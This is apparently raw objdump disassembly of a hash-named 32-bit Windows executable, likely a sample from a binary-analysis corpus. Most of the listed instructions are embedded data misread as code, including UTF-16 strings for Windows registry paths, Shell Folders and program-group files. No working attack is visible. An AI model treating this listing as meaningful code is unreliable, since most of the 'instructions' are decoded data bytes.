
182b76c6236027029d3afd9482e5c0e4bb89116dd214c11897c56517fc25a87b.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [eax],al
  401002:	add    BYTE PTR [eax],al
  401004:	loopne 0x40106e
  401006:	inc    eax
  401007:	add    al,dl
  401009:	daa    
  40100a:	inc    eax
  40100b:	add    al,dh
  40100d:	daa    
  40100e:	inc    eax
	...
  401017:	add    BYTE PTR [eax],dl
  401019:	push   0x6e300040
  40101e:	inc    eax
  40101f:	add    BYTE PTR [eax],al
  401021:	add    BYTE PTR [eax],al
  401023:	add    al,dh
  401025:	and    eax,0x27d00000
  40102a:	add    BYTE PTR [eax],al
  40102c:	lock daa 
  40102e:	add    BYTE PTR [eax],al
  401030:	lock cmp eax,0x3e100000
  401036:	add    BYTE PTR [eax],al
  401038:	add    BYTE PTR [edi],bh
  40103a:	add    BYTE PTR [eax],al
  40103c:	push   eax
  40103d:	aas    
  40103e:	add    BYTE PTR [eax],al
  401040:	rol    BYTE PTR [esi+0x0],0x0
  401044:	rol    BYTE PTR [esi+0x0],1
  401047:	add    al,dl
  401049:	inc    edi
  40104a:	add    BYTE PTR [eax],al
  40104c:	loopne 0x401095
  40104e:	add    BYTE PTR [eax],al
  401050:	ror    BYTE PTR [ebx+0x0],1
  401053:	add    BYTE PTR [eax],dh
  401055:	dec    esp
  401056:	add    BYTE PTR [eax],al
  401058:	xor    BYTE PTR [esi+0x0],cl
  40105b:	add    BYTE PTR [eax-0x6fffffb0],ah
  401061:	push   ecx
  401062:	add    BYTE PTR [eax],al
  401064:	lock push ebp
  401066:	add    BYTE PTR [eax],al
  401068:	push   eax
  401069:	pop    ecx
  40106a:	add    BYTE PTR [eax],al
  40106c:	add    BYTE PTR [eax+0x0],ah
  40106f:	add    BYTE PTR [eax],dl
  401071:	push   0x68e00000
  401076:	add    BYTE PTR [eax],al
  401078:	and    BYTE PTR [ecx+0x0],ch
  40107b:	add    BYTE PTR [eax+0x6b],dh
  40107e:	add    BYTE PTR [eax],al
  401080:	nop
  401081:	ins    DWORD PTR es:[edi],dx
  401082:	add    BYTE PTR [eax],al
  401084:	mov    al,0x6d
  401086:	add    BYTE PTR [eax],al
  401088:	loopne 0x4010f7
  40108a:	add    BYTE PTR [eax],al
  40108c:	xor    BYTE PTR [esi+0x0],ch
  40108f:	add    BYTE PTR [eax],dl
  401091:	jno    0x401093
  401093:	add    BYTE PTR [eax-0x3fffff8f],ah
  401099:	jb     0x40109b
  40109b:	add    BYTE PTR [eax],dl
  40109d:	jae    0x40109f
  40109f:	add    BYTE PTR [eax+0x73],dh
	...
  4010ae:	add    BYTE PTR [eax],al
  4010b0:	cwde   
  4010b1:	add    BYTE PTR [eax+0x0],0xe8
  4010b5:	add    BYTE PTR [eax+0x0],0xb0
  4010b9:	ins    DWORD PTR es:[edi],dx
  4010ba:	inc    eax
  4010bb:	add    BYTE PTR [eax],al
  4010bd:	pusha  
  4010be:	inc    eax
  4010bf:	add    al,dh
  4010c1:	push   ebp
  4010c2:	inc    eax
  4010c3:	add    BYTE PTR [eax+0x4050],ah
  4010c9:	pusha  
  4010ca:	inc    eax
  4010cb:	add    BYTE PTR [eax-0x6fffbf93],dl
  4010d1:	ins    DWORD PTR es:[edi],dx
  4010d2:	inc    eax
  4010d3:	add    al,dl
  4010d5:	dec    ebx
  4010d6:	inc    eax
  4010d7:	add    al,dl
  4010d9:	inc    edi
  4010da:	inc    eax
  4010db:	add    al,ah
  4010dd:	inc    edi
  4010de:	inc    eax
  4010df:	add    BYTE PTR [eax],dh
  4010e1:	dec    esp
  4010e2:	inc    eax
  4010e3:	add    BYTE PTR [eax],al
  4010e5:	pusha  
  4010e6:	inc    eax
  4010e7:	add    BYTE PTR [eax-0x5fffbfaf],dl
  4010ed:	push   eax
  4010ee:	inc    eax
  4010ef:	add    BYTE PTR [eax],al
  4010f1:	pusha  
  4010f2:	inc    eax
  4010f3:	add    BYTE PTR [eax],dh
  4010f5:	dec    esi
  4010f6:	inc    eax
  4010f7:	add    BYTE PTR [eax+0x4050],ah
  4010fd:	pusha  
  4010fe:	inc    eax
  4010ff:	add    BYTE PTR [eax+0x59],dl
  401102:	inc    eax
  401103:	add    BYTE PTR [eax+0x53004050],ah
  401109:	add    BYTE PTR [edi+0x0],ch
  40110c:	data16 add BYTE PTR [eax+eax*1+0x77],dh
  401111:	add    BYTE PTR [ecx+0x0],ah
  401114:	jb     0x401116
  401116:	add    BYTE PTR gs:[eax+eax*1+0x4d],bl
  40111b:	add    BYTE PTR [ecx+0x0],ch
  40111e:	arpl   WORD PTR [eax],ax
  401120:	jb     0x401122
  401122:	outs   dx,DWORD PTR ds:[esi]
  401123:	add    BYTE PTR [ebx+0x0],dh
  401126:	outs   dx,DWORD PTR ds:[esi]
  401127:	add    BYTE PTR [esi+0x0],ah
  40112a:	je     0x40112c
  40112c:	pop    esp
  40112d:	add    BYTE PTR [edi+0x0],dl
  401130:	imul   eax,DWORD PTR [eax],0x64006e
  401136:	outs   dx,DWORD PTR ds:[esi]
  401137:	add    BYTE PTR [edi+0x0],dh
  40113a:	jae    0x40113c
  40113c:	pop    esp
  40113d:	add    BYTE PTR [ebx+0x0],al
  401140:	jne    0x401142
  401142:	jb     0x401144
  401144:	jb     0x401146
  401146:	add    BYTE PTR gs:[esi+0x0],ch
  40114a:	je     0x40114c
  40114c:	push   esi
  40114d:	add    BYTE PTR [ebp+0x0],ah
  401150:	jb     0x401152
  401152:	jae    0x401154
  401154:	imul   eax,DWORD PTR [eax],0x6e006f
  40115a:	pop    esp
  40115b:	add    BYTE PTR [ebp+0x0],al
  40115e:	js     0x401160
  401160:	jo     0x401162
  401162:	ins    BYTE PTR es:[edi],dx
  401163:	add    BYTE PTR [edi+0x0],ch
  401166:	jb     0x401168
  401168:	add    BYTE PTR gs:[edx+0x0],dh
  40116c:	pop    esp
  40116d:	add    BYTE PTR [ebx+0x0],dl
  401170:	push   0x6c006500
  401175:	add    BYTE PTR [eax+eax*1+0x20],ch
  401179:	add    BYTE PTR [esi+0x0],al
  40117c:	outs   dx,DWORD PTR ds:[esi]
  40117d:	add    BYTE PTR [eax+eax*1+0x64],ch
  401181:	add    BYTE PTR [ebp+0x0],ah
  401184:	jb     0x401186
  401186:	jae    0x401188
  401188:	add    BYTE PTR [eax],al
  40118a:	add    BYTE PTR [eax],al
  40118c:	and    al,BYTE PTR [eax]
  40118e:	add    BYTE PTR [eax],al
  401190:	add    BYTE PTR cs:[eax+eax*1+0x6e],ch
  401195:	add    BYTE PTR [ebx+0x0],ch
  401198:	add    BYTE PTR [eax],al
  40119a:	add    BYTE PTR [eax],al
  40119c:	and    eax,0x4f004800
  4011a1:	add    BYTE PTR [ebp+0x0],cl
  4011a4:	inc    ebp
  4011a5:	add    BYTE PTR [eax+eax*1+0x52],al
  4011a9:	add    BYTE PTR [ecx+0x0],cl
  4011ac:	push   esi
  4011ad:	add    BYTE PTR [ebp+0x0],al
  4011b0:	and    eax,0x48002500
  4011b5:	add    BYTE PTR [edi+0x0],cl
  4011b8:	dec    ebp
  4011b9:	add    BYTE PTR [ebp+0x0],al
  4011bc:	push   eax
  4011bd:	add    BYTE PTR [ecx+0x0],al
  4011c0:	push   esp
  4011c1:	add    BYTE PTR [eax+0x0],cl
  4011c4:	and    eax,0x2e000000
  4011c9:	add    BYTE PTR [eax+0x0],dh
  4011cc:	imul   eax,DWORD PTR [eax],0x66
  4011d2:	add    BYTE PTR [eax],al
  4011d4:	and    eax,0x53005500
  4011d9:	add    BYTE PTR [ebp+0x0],al
  4011dc:	push   edx
  4011dd:	add    BYTE PTR [eax+0x0],dl
  4011e0:	push   edx
  4011e1:	add    BYTE PTR [edi+0x0],cl
  4011e4:	inc    esi
  4011e5:	add    BYTE PTR [ecx+0x0],cl
  4011e8:	dec    esp
  4011e9:	add    BYTE PTR [ebp+0x0],al
  4011ec:	and    eax,0x73000000
  4011f1:	add    BYTE PTR [ebp+0x0],ah
  4011f4:	je     0x4011f6
  4011f6:	jne    0x4011f8
  4011f8:	jo     0x4011fa
  4011fa:	add    BYTE PTR cs:[ecx+0x0],ch
  4011fe:	outs   dx,BYTE PTR ds:[esi]
  4011ff:	add    BYTE PTR [ecx+0x0],ch
  401202:	add    BYTE PTR [eax],al
  401204:	jo     0x401206
  401206:	jb     0x401208
  401208:	outs   dx,DWORD PTR ds:[esi]
  401209:	add    BYTE PTR [edi+0x0],ah
  40120c:	ins    DWORD PTR es:[edi],dx
  40120d:	add    BYTE PTR [ecx+0x0],ah
  401210:	outs   dx,BYTE PTR ds:[esi]
  401211:	add    BYTE PTR [esi],ch
  401213:	add    BYTE PTR [edi+0x0],ah
  401216:	jb     0x401218
  401218:	outs   dx,DWORD PTR ds:[esi]
  401219:	add    BYTE PTR [ebp+0x0],dh
  40121c:	jo     0x40121e
  40121e:	jae    0x401220
  401220:	add    BYTE PTR [eax],al
  401222:	add    BYTE PTR [eax],al
  401224:	jo     0x401226
  401226:	jb     0x401228
  401228:	outs   dx,DWORD PTR ds:[esi]
  401229:	add    BYTE PTR [edi+0x0],ah
  40122c:	ins    DWORD PTR es:[edi],dx
  40122d:	add    BYTE PTR [ecx+0x0],ah
  401230:	outs   dx,BYTE PTR ds:[esi]
  401231:	add    BYTE PTR [esi],ch
  401233:	add    BYTE PTR [edi+0x0],ch
  401236:	outs   dx,BYTE PTR ds:[esi]
  401237:	add    BYTE PTR [eax+eax*1+0x79],ch
  40123b:	add    BYTE PTR [eax],al
  40123d:	add    BYTE PTR [eax],al
  40123f:	add    BYTE PTR [eax+eax*1+0x65],ah
  401243:	add    BYTE PTR [ebx+0x0],dh
  401246:	imul   eax,DWORD PTR [eax],0x74
  401249:	add    BYTE PTR [edi+0x0],ch
  40124c:	jo     0x40124e
  40124e:	add    BYTE PTR cs:[edi+0x0],ah
  401252:	jb     0x401254
  401254:	outs   dx,DWORD PTR ds:[esi]
  401255:	add    BYTE PTR [ebp+0x0],dh
  401258:	jo     0x40125a
  40125a:	jae    0x40125c
  40125c:	add    BYTE PTR [eax],al
  40125e:	add    BYTE PTR [eax],al
  401260:	jae    0x401262
  401262:	je     0x401264
  401264:	popa   
  401265:	add    BYTE PTR [edx+0x0],dh
  401268:	je     0x40126a
  40126a:	jne    0x40126c
  40126c:	jo     0x40126e
  40126e:	add    BYTE PTR cs:[edi+0x0],ah
  401272:	jb     0x401274
  401274:	outs   dx,DWORD PTR ds:[esi]
  401275:	add    BYTE PTR [ebp+0x0],dh
  401278:	jo     0x40127a
  40127a:	jae    0x40127c
  40127c:	add    BYTE PTR [eax],al
  40127e:	add    BYTE PTR [eax],al
  401280:	jae    0x401282
  401282:	add    BYTE PTR gs:[esi+0x0],ch
  401286:	add    BYTE PTR fs:[eax+eax*1+0x6f],dh
  40128b:	add    BYTE PTR [esi],ch
  40128d:	add    BYTE PTR [edi+0x0],ah
  401290:	jb     0x401292
  401292:	outs   dx,DWORD PTR ds:[esi]
  401293:	add    BYTE PTR [ebp+0x0],dh
  401296:	jo     0x401298
  401298:	jae    0x40129a
  40129a:	add    BYTE PTR [eax],al
  40129c:	jb     0x40129e
  40129e:	add    BYTE PTR gs:[ebx+0x0],ah
  4012a2:	add    BYTE PTR gs:[esi+0x0],ch
  4012a6:	je     0x4012a8
  4012a8:	add    BYTE PTR fs:[edi+0x0],ch
  4012ac:	arpl   WORD PTR [eax],ax
  4012ae:	jae    0x4012b0
  4012b0:	add    BYTE PTR cs:[edi+0x0],ah
  4012b4:	jb     0x4012b6
  4012b6:	outs   dx,DWORD PTR ds:[esi]
  4012b7:	add    BYTE PTR [ebp+0x0],dh
  4012ba:	jo     0x4012bc
  4012bc:	jae    0x4012be
  4012be:	add    BYTE PTR [eax],al
  4012c0:	push   ebx
  4012c1:	add    BYTE PTR [edi+0x0],ch
  4012c4:	data16 add BYTE PTR [eax+eax*1+0x77],dh
  4012c9:	add    BYTE PTR [ecx+0x0],ah
  4012cc:	jb     0x4012ce
  4012ce:	add    BYTE PTR gs:[eax+eax*1+0x4d],bl
  4012d3:	add    BYTE PTR [ecx+0x0],ch
  4012d6:	arpl   WORD PTR [eax],ax
  4012d8:	jb     0x4012da
  4012da:	outs   dx,DWORD PTR ds:[esi]
  4012db:	add    BYTE PTR [ebx+0x0],dh
  4012de:	outs   dx,DWORD PTR ds:[esi]
  4012df:	add    BYTE PTR [esi+0x0],ah
  4012e2:	je     0x4012e4
  4012e4:	pop    esp
  4012e5:	add    BYTE PTR [edi+0x0],dl
  4012e8:	imul   eax,DWORD PTR [eax],0x64006e
  4012ee:	outs   dx,DWORD PTR ds:[esi]
  4012ef:	add    BYTE PTR [edi+0x0],dh
  4012f2:	jae    0x4012f4
  4012f4:	pop    esp
  4012f5:	add    BYTE PTR [ebx+0x0],al
  4012f8:	jne    0x4012fa
  4012fa:	jb     0x4012fc
  4012fc:	jb     0x4012fe
  4012fe:	add    BYTE PTR gs:[esi+0x0],ch
  401302:	je     0x401304
  401304:	push   esi
  401305:	add    BYTE PTR [ebp+0x0],ah
  401308:	jb     0x40130a
  40130a:	jae    0x40130c
  40130c:	imul   eax,DWORD PTR [eax],0x6e006f
  401312:	add    BYTE PTR [eax],al
  401314:	push   eax
  401315:	add    BYTE PTR [edx+0x0],dh
  401318:	add    BYTE PTR gs:[ebx+0x0],al
  40131c:	outs   dx,DWORD PTR ds:[esi]
  40131d:	add    BYTE PTR [esi+0x0],ch
  401320:	jbe    0x401322
  401322:	push   edx
  401323:	add    BYTE PTR [ebp+0x0],ah
  401326:	outs   dx,BYTE PTR ds:[esi]
  401327:	add    BYTE PTR [ecx+0x0],ah
  40132a:	ins    DWORD PTR es:[edi],dx
  40132b:	add    BYTE PTR [ebp+0x0],ah
  40132e:	inc    esi
  40132f:	add    BYTE PTR [ecx+0x0],ch
  401332:	ins    BYTE PTR es:[edi],dx
  401333:	add    BYTE PTR [ebp+0x0],ah
  401336:	jae    0x401338
  401338:	add    BYTE PTR [eax],al
  40133a:	add    BYTE PTR [eax],al
  40133c:	inc    esp
  40133d:	add    BYTE PTR [ebp+0x0],ah
  401340:	ins    BYTE PTR es:[edi],dx
  401341:	add    BYTE PTR [ebp+0x0],ah
  401344:	je     0x401346
  401346:	add    BYTE PTR gs:[esi+0x0],al
  40134a:	imul   eax,DWORD PTR [eax],0x65006c
  401350:	jae    0x401352
  401352:	add    BYTE PTR [eax],al
  401354:	push   edx
  401355:	add    BYTE PTR [ebp+0x0],ah
  401358:	outs   dx,BYTE PTR ds:[esi]
  401359:	add    BYTE PTR [ecx+0x0],ah
  40135c:	ins    DWORD PTR es:[edi],dx
  40135d:	add    BYTE PTR [ebp+0x0],ah
  401360:	inc    esi
  401361:	add    BYTE PTR [ecx+0x0],ch
  401364:	ins    BYTE PTR es:[edi],dx
  401365:	add    BYTE PTR [ebp+0x0],ah
  401368:	jae    0x40136a
  40136a:	add    BYTE PTR [eax],al
  40136c:	add    BYTE PTR [eax],al
  40136e:	add    BYTE PTR [eax],al
  401370:	push   ebx
  401371:	add    BYTE PTR [edi+0x0],ch
  401374:	data16 add BYTE PTR [eax+eax*1+0x77],dh
  401379:	add    BYTE PTR [ecx+0x0],ah
  40137c:	jb     0x40137e
  40137e:	add    BYTE PTR gs:[eax+eax*1+0x4d],bl
  401383:	add    BYTE PTR [ecx+0x0],ch
  401386:	arpl   WORD PTR [eax],ax
  401388:	jb     0x40138a
  40138a:	outs   dx,DWORD PTR ds:[esi]
  40138b:	add    BYTE PTR [ebx+0x0],dh
  40138e:	outs   dx,DWORD PTR ds:[esi]
  40138f:	add    BYTE PTR [esi+0x0],ah
  401392:	je     0x401394
  401394:	pop    esp
  401395:	add    BYTE PTR [edi+0x0],dl
  401398:	imul   eax,DWORD PTR [eax],0x64006e
  40139e:	outs   dx,DWORD PTR ds:[esi]
  40139f:	add    BYTE PTR [edi+0x0],dh
  4013a2:	jae    0x4013a4
  4013a4:	pop    esp
  4013a5:	add    BYTE PTR [ebx+0x0],al
  4013a8:	jne    0x4013aa
  4013aa:	jb     0x4013ac
  4013ac:	jb     0x4013ae
  4013ae:	add    BYTE PTR gs:[esi+0x0],ch
  4013b2:	je     0x4013b4
  4013b4:	push   esi
  4013b5:	add    BYTE PTR [ebp+0x0],ah
  4013b8:	jb     0x4013ba
  4013ba:	jae    0x4013bc
  4013bc:	imul   eax,DWORD PTR [eax],0x6e006f
  4013c2:	pop    esp
  4013c3:	add    BYTE PTR [edi+0x0],al
  4013c6:	jb     0x4013c8
  4013c8:	jo     0x4013ca
  4013ca:	inc    ebx
  4013cb:	add    BYTE PTR [edi+0x0],ch
  4013ce:	outs   dx,BYTE PTR ds:[esi]
  4013cf:	add    BYTE PTR [esi+0x0],dh
  4013d2:	add    BYTE PTR [eax],al
  4013d4:	das    
  4013d5:	add    BYTE PTR [edi+0x0],ch
  4013d8:	add    BYTE PTR [eax],al
  4013da:	add    BYTE PTR [eax],al
  4013dc:	sub    eax,0x6f00
  4013e1:	add    BYTE PTR [eax],al
  4013e3:	add    BYTE PTR [esi],ch
  4013e5:	add    BYTE PTR [edi+0x0],ah
  4013e8:	jb     0x4013ea
  4013ea:	jo     0x4013ec
	...
  4013f4:	inc    ebp
  4013f5:	js     0x40145a
  4013f7:	gs jo  0x40146e
  4013fa:	imul   ebp,DWORD PTR [edi+0x6e],0x52000000
  401401:	gs je  0x401479
  401404:	jb     0x401474
  401406:	dec    eax
  401407:	jb     0x401409
  401409:	add    BYTE PTR [eax],al
  40140b:	add    BYTE PTR [edx+0x65],dl
  40140e:	je     0x401485
  401410:	jb     0x401480
  401412:	dec    eax
  401413:	jb     0x401470
  401415:	push   eax
  401416:	jb     0x40147d
  401418:	push   edx
  401419:	gs ins BYTE PTR es:[edi],dx
  40141b:	gs popa 
  40141d:	jae    0x401484
  40141f:	pop    ebp
  401420:	add    BYTE PTR [eax],al
  401422:	add    BYTE PTR [eax],al
  401424:	dec    esp
  401425:	outs   dx,DWORD PTR ds:[esi]
  401426:	addr16 dec eax
  401428:	jb     0x40142a
  40142a:	add    BYTE PTR [eax],al
  40142c:	inc    esi
  40142d:	popa   
  40142e:	imul   ebp,DWORD PTR [esi+eax*2+0x61],0x7473
  401436:	add    BYTE PTR [eax],al
  401438:	and    eax,0x73006800
  40143d:	add    BYTE PTR [eax],ch
  40143f:	add    BYTE PTR ds:0x29006400,ah
  401445:	add    BYTE PTR [eax+eax*1+0x25],bl
  401449:	add    BYTE PTR [eax+0x0],ch
  40144c:	jae    0x40144e
  40144e:	and    DWORD PTR [eax],eax
  401450:	and    eax,0x3a007000
  401455:	add    BYTE PTR [eax],ah
  401457:	add    BYTE PTR [eax],al
  401459:	add    BYTE PTR [eax],al
  40145b:	add    BYTE PTR ds:0x73006800,ah
  401461:	add    BYTE PTR [ecx],ah
  401463:	add    BYTE PTR ds:0x3a007000,ah
  401469:	add    BYTE PTR [eax],ah
  40146b:	add    BYTE PTR [eax],al
  40146d:	add    BYTE PTR [eax],al
  40146f:	add    BYTE PTR [eax],ch
  401471:	add    BYTE PTR [ebx+0x0],ah
  401474:	popa   
  401475:	add    BYTE PTR [eax+eax*1+0x6c],ch
  401479:	add    BYTE PTR [ebp+0x0],ah
  40147c:	jb     0x40147e
  40147e:	cmp    al,BYTE PTR [eax]
  401480:	and    BYTE PTR [eax],al
  401482:	and    eax,0x29007000
  401487:	add    BYTE PTR [eax],ah
  401489:	add    BYTE PTR [eax],al
  40148b:	add    BYTE PTR ds:0x73006800,ah
  401491:	add    BYTE PTR [eax],ch
  401493:	add    BYTE PTR ds:0x29006400,ah
  401499:	add    BYTE PTR [eax],ah
  40149b:	add    BYTE PTR [eax+eax*1+0x69],dh
  40149f:	add    BYTE PTR [eax+eax*1+0x28],ah
  4014a3:	add    BYTE PTR ds:0x29007800,ah
  4014a9:	add    BYTE PTR [eax],ah
  4014ab:	add    BYTE PTR ds:0x38003000,ah
  4014b1:	add    BYTE PTR [eax+0x0],bl
  4014b4:	and    BYTE PTR [eax],al
  4014b6:	and    eax,0x73007700
  4014bb:	add    BYTE PTR [eax],al
  4014bd:	add    BYTE PTR [eax],al
  4014bf:	add    BYTE PTR [eax],ah
  4014c1:	add    BYTE PTR [eax],ah
  4014c3:	add    BYTE PTR [eax],ah
  4014c5:	add    BYTE PTR [eax],ah
  4014c7:	add    BYTE PTR [eax],al
  4014c9:	add    BYTE PTR [eax],al
  4014cb:	add    BYTE PTR [ebp+0x0],cl
  4014ce:	jae    0x4014d0
  4014d0:	add    BYTE PTR [bp+si],bh
  4014d3:	add    BYTE PTR [ebx+0x0],bl
  4014d6:	and    eax,0x73007700
  4014db:	add    BYTE PTR [ebp+0x0],bl
  4014de:	and    BYTE PTR [eax],al
  4014e0:	add    BYTE PTR [eax],al
  4014e2:	add    BYTE PTR [eax],al
  4014e4:	inc    ebx
  4014e5:	add    BYTE PTR [ecx+0x0],ah
  4014e8:	ins    BYTE PTR es:[edi],dx
  4014e9:	add    BYTE PTR [eax+eax*1+0x43],ch
  4014ed:	add    BYTE PTR [edi+0x0],ch
  4014f0:	outs   dx,BYTE PTR ds:[esi]
  4014f1:	add    BYTE PTR [eax+eax*1+0x65],dh
  4014f5:	add    BYTE PTR [eax+0x0],bh
  4014f8:	je     0x4014fa
  4014fa:	cmp    al,BYTE PTR [eax]
  4014fc:	pop    ebx
  4014fd:	add    BYTE PTR ds:0x73006800,ah
  401503:	add    BYTE PTR [ebp+0x0],bl
  401506:	and    BYTE PTR [eax],al
  401508:	add    BYTE PTR [eax],al
  40150a:	add    BYTE PTR [eax],al
  40150c:	pop    ebx
  40150d:	add    BYTE PTR ds:0x73006800,ah
  401513:	add    BYTE PTR [eax],ch
  401515:	add    BYTE PTR ds:0x73006800,ah
  40151b:	add    BYTE PTR [ecx],ch
  40151d:	add    BYTE PTR [ebp+0x0],bl
  401520:	or     al,BYTE PTR [eax]
  401522:	add    BYTE PTR [eax],al
  401524:	pop    ebx
  401525:	add    BYTE PTR ds:0x73006800,ah
  40152b:	add    BYTE PTR [ebp+0x0],bl
  40152e:	or     al,BYTE PTR [eax]
  401530:	add    BYTE PTR [eax],al
  401532:	add    BYTE PTR [eax],al
  401534:	or     al,BYTE PTR [eax]
  401536:	add    BYTE PTR [eax],al
  401538:	outs   dx,BYTE PTR ds:[esi]
  401539:	add    BYTE PTR [eax+eax*1+0x64],dh
  40153d:	add    BYTE PTR [eax+eax*1+0x6c],ch
  401541:	add    BYTE PTR [esi],ch
  401543:	add    BYTE PTR [eax+eax*1+0x6c],ah
  401547:	add    BYTE PTR [eax+eax*1+0x0],ch
  40154b:	add    BYTE PTR [esp+eiz*2+0x72],cl
  40154f:	inc    esi
  401550:	popa   
  401551:	jae    0x4015c7
  401553:	inc    esi
  401554:	popa   
  401555:	imul   ebp,DWORD PTR [ecx+ecx*2+0x6e],0x64616f4c
  40155d:	gs jb  0x4015a3
  401560:	popa   
  401561:	ins    BYTE PTR es:[edi],dx
  401562:	ins    BYTE PTR es:[edi],dx
  401563:	outs   dx,DWORD PTR ds:[esi]
  401564:	jne    0x4015da
  401566:	add    BYTE PTR [eax],al
  401568:	push   edx
  401569:	je     0x4015d7
  40156b:	dec    esi
  40156c:	je     0x4015c1
  40156e:	je     0x4015d1
  401570:	je     0x4015e7
  401572:	jae    0x4015c8
  401574:	outs   dx,DWORD PTR ds:[esi]
  401575:	inc    esp
  401576:	outs   dx,DWORD PTR ds:[esi]
  401577:	jae    0x4015be
  401579:	jb     0x4015ed
  40157b:	outs   dx,DWORD PTR ds:[esi]
  40157c:	jb     0x4015cc
  40157e:	outs   dx,DWORD PTR ds:[esi]
  40157f:	push   esp
  401580:	bound  eax,QWORD PTR gs:[eax]
  401583:	add    BYTE PTR [ecx+0x6e],ch
  401586:	je     0x4015ed
  401588:	jb     0x4015f8
  40158a:	popa   
  40158b:	ins    BYTE PTR es:[edi],dx
  40158c:	pop    esp
  40158d:	jae    0x4015f3
  40158f:	imul   ebx,DWORD PTR [ecx+ebp*2+0x6e],0x63
  401594:	pop    esp
  401595:	ja     0x401600
  401597:	ins    BYTE PTR es:[edi],dx
  401598:	pop    esp
  401599:	jb     0x401600
  40159b:	jae    0x401612
  40159d:	ins    BYTE PTR es:[edi],dx
  40159e:	je     0x4015ce
  4015a0:	push   0x49000000
  4015a5:	outs   dx,BYTE PTR ds:[esi]
  4015a6:	jbe    0x401609
  4015a8:	ins    BYTE PTR es:[edi],dx
  4015a9:	imul   esp,DWORD PTR [ecx+eax*2+0x72],0x656d7567
  4015b1:	outs   dx,BYTE PTR ds:[esi]
  4015b2:	je     0x401627
  4015b4:	add    BYTE PTR [eax],al
  4015b6:	add    BYTE PTR [eax],al
  4015b8:	inc    edx
  4015b9:	jne    0x401624
  4015bb:	ins    BYTE PTR es:[edi],dx
  4015bc:	fs inc esp
  4015be:	gs popaw 
  4015c1:	jne    0x40162f
  4015c3:	je     0x40160c
  4015c5:	jb     0x401636
  4015c7:	jne    0x401639
  4015c9:	jae    0x4015cb
  4015cb:	add    BYTE PTR [edx+0x75],al
  4015ce:	imul   ebp,DWORD PTR [esp+eiz*2+0x53],0x69746365
  4015d6:	outs   dx,DWORD PTR ds:[esi]
  4015d7:	outs   dx,BYTE PTR ds:[esi]
  4015d8:	inc    edi
  4015d9:	jb     0x40164a
  4015db:	jne    0x40164d
  4015dd:	jae    0x4015df
  4015df:	add    BYTE PTR [edx+0x75],al
  4015e2:	imul   ebp,DWORD PTR [esp+eiz*2+0x47],0x70756f72
  4015ea:	add    BYTE PTR [eax],al
  4015ec:	ja     0x40164b
  4015ee:	jg     0x401597
  4015f0:	sub    ebp,DWORD PTR [esi]
  4015f2:	ret    
  4015f3:	inc    esp
  4015f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015f5:	mov    ds:0x501a6ab,al
  4015fa:	dec    edx
  4015fb:	push   ecx
  4015fc:	stc    
  4015fd:	adc    al,0x2
  4015ff:	add    BYTE PTR [eax],al
  401601:	add    BYTE PTR [eax],al
  401603:	add    al,al
  401605:	add    BYTE PTR [eax],al
  401607:	add    BYTE PTR [eax],al
  401609:	add    BYTE PTR [eax],al
  40160b:	inc    esi
  40160c:	mov    ebx,0x6ab97d20
  401611:	hlt    
  401612:	xchg   edi,eax
  401613:	dec    esp
  401614:	mov    edx,0x8365e10
  401619:	inc    ebx
  40161a:	or     BYTE PTR [ecx+eax*1+0x14],dl
  40161e:	add    al,BYTE PTR [eax]
  401620:	add    BYTE PTR [eax],al
  401622:	add    BYTE PTR [eax],al
  401624:	rol    BYTE PTR [eax],0x0
  401627:	add    BYTE PTR [eax],al
  401629:	add    BYTE PTR [eax],al
  40162b:	inc    esi
  40162c:	or     eax,DWORD PTR [ecx]
  40162e:	add    BYTE PTR [eax],al
  401630:	add    BYTE PTR [eax],al
  401632:	add    BYTE PTR [eax],al
  401634:	rol    BYTE PTR [eax],0x0
  401637:	add    BYTE PTR [eax],al
  401639:	add    BYTE PTR [eax],al
  40163b:	inc    esi
	...
  401644:	aas    
  401645:	cmp    al,0x9f
  401647:	push   ebp
  401648:	add    BYTE PTR [eax],al
  40164a:	add    BYTE PTR [eax],al
  40164c:	add    al,BYTE PTR [eax]
  40164e:	add    BYTE PTR [eax],al
  401650:	and    al,0x0
  401652:	add    BYTE PTR [eax],al
  401654:	and    BYTE PTR [ebx],ah
  401656:	add    BYTE PTR [eax],al
  401658:	and    BYTE PTR [edi],dl
  40165a:	add    BYTE PTR [eax],al
  40165c:	add    BYTE PTR [eax],al
  40165e:	add    BYTE PTR [eax],al
  401660:	aas    
  401661:	cmp    al,0x9f
  401663:	push   ebp
  401664:	add    BYTE PTR [eax],al
  401666:	add    BYTE PTR [eax],al
  401668:	or     eax,0x84000000
  40166d:	add    al,BYTE PTR [eax]
  40166f:	add    BYTE PTR [eax+0x23],bl
  401672:	add    BYTE PTR [eax],al
  401674:	pop    eax
  401675:	pop    ss
	...
  401696:	add    BYTE PTR [eax],al
  401698:	push   0x0
	...
  4016d1:	add    BYTE PTR [eax],al
  4016d3:	add    BYTE PTR [eax+eax*4],al
  4016d6:	inc    eax
  4016d7:	add    BYTE PTR [eax],al
  4016d9:	pop    ss
  4016da:	inc    eax
  4016db:	add    BYTE PTR [ecx],al
  4016dd:	add    BYTE PTR [eax],al
  4016df:	add    BYTE PTR [eax],dl
  4016e1:	xchg   edx,eax
  4016e2:	inc    eax
  4016e3:	add    BYTE PTR [eax],al
  4016e5:	add    BYTE PTR [eax],al
  4016e7:	add    BYTE PTR [eax+edx*1],ah
  4016ea:	inc    eax
  4016eb:	add    BYTE PTR [eax],ah
  4016ed:	add    BYTE PTR [eax],al
  4016ef:	add    BYTE PTR [eax],al
  4016f1:	xor    eax,0x0
	...
  4016fe:	add    BYTE PTR [eax],al
  401700:	mov    al,ds:0x71
  401705:	add    BYTE PTR [eax],al
  401707:	add    BYTE PTR [ebp+0x54],al
  40170a:	push   edi
  40170b:	xor    BYTE PTR [eax],dl
  40170d:	add    BYTE PTR [eax],al
  40170f:	add    BYTE PTR [esi+0x2b88040e],al
  401715:	add    eax,0xb03bb8a
  40171a:	add    eax,0x1
  40171f:	add    BYTE PTR [eax],al
  401721:	and    BYTE PTR [eax],al
  401723:	add    BYTE PTR [eax+0x0],al
  401726:	add    BYTE PTR [edx+0x75],al
  401729:	imul   ebp,DWORD PTR [esp+eiz*2+0x47],0x70756f72
  401731:	add    BYTE PTR [edi+0x69],dh
  401734:	ins    BYTE PTR es:[edi],dx
  401735:	inc    ecx
  401736:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  40173a:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x68740198
  401742:	jb     0x4017a9
  401744:	popa   
